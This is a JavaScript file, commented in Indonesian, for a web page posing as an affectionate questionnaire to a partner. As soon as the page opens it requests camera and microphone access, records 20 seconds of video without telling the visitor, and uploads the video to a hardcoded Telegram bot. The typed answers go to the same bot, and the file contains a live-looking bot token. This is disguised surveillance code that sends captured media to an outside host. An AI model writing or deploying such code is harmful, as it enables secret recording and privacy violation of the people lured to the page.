let countdownElement = document.getElementById('countdown');
let countdownTime = 20; // waktu rekaman 20 detik
let mediaRecorder;
let recordedChunks = [];

// Fungsi untuk memulai hitung mundur
function startCountdown() {
    const countdownInterval = setInterval(() => {
        countdownTime--;
        countdownElement.textContent = countdownTime;

        if (countdownTime <= 0) {
            clearInterval(countdownInterval);
            stopRecording(); // hentikan rekaman saat hitungan selesai
        }
    }, 1000);
}

// Fungsi untuk memulai rekaman
function startRecording() {
    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
            mediaRecorder = new MediaRecorder(stream);
            mediaRecorder.ondataavailable = function(event) {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = function() {
                const blob = new Blob(recordedChunks, {
                    type: 'video/webm'
                });

                sendVideoToTelegram(blob);
            };

            mediaRecorder.start();
            startCountdown(); // mulai hitung mundur dan rekaman
        })
        .catch(error => {
            console.error('Error accessing media devices.', error);
        });
}

// Fungsi untuk menghentikan rekaman
function stopRecording() {
    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
        mediaRecorder.stop();
    }
}

// Fungsi untuk mengirim video ke Telegram
function sendVideoToTelegram(blob) {
    const botToken = '7258081396:AAHIu5xiKaw5qmSpo_JSScYZkrXzcFpTW4Q'; // Ganti dengan token bot Anda
    const chatId = '-4545188605'; // Ganti dengan ID chat tujuan
    const url = `https://api.telegram.org/bot${botToken}/sendDocument`;

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('document', blob, 'recording.webm');

    fetch(url, {
        method: 'POST',
        body: formData,
    })
    .then(response => response.json())
    .then(data => {
        console.log('Video berhasil terkirim!');
    })
    .catch(error => {
        console.error('Error mengirim video!', error);
    });
}

// Fungsi untuk mengirim semua jawaban
function sendAllAnswers() {
    const questions = [
        { id: 'question1', text: "Haiii cantikkkuuu, bagaimana kabarmu hari ini?" },
        { id: 'question2', text: "Kamuuu sudaaa mam belummm?" },
        { id: 'question3', text: "Apakah kamu merindukanku hari ini?" },
        { id: 'question4', text: "Kita jajan eskrimm mau tidaaa?" },
        { id: 'question5', text: "apa yangg inginn kamuu sampaikann hari inii?" }
    ];

    let allAnswers = '';

    questions.forEach(question => {
        const answer = document.getElementById(question.id).value;
        allAnswers += `${question.text} ${answer}\n`;
    });

    const botToken = '7258081396:AAHIu5xiKaw5qmSpo_JSScYZkrXzcFpTW4Q'; // Ganti dengan token bot Anda
    const chatId = '-4545188605'; // Ganti dengan ID chat tujuan
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: allAnswers
        }),
    })
    .then(response => response.json())
    .then(data => {
        alert('Semua jawaban berhasil terkirim!');
    })
    .catch(error => {
        console.error('Error:', error);
    });
}

// Menjalankan rekaman otomatis saat halaman dibuka
window.onload = () => {
    startRecording(); // Mulai merekam otomatis saat halaman dibuka

    // Menangani klik tombol kirim semua jawaban
    document.getElementById("sendAllAnswersButton").addEventListener("click", sendAllAnswers);
};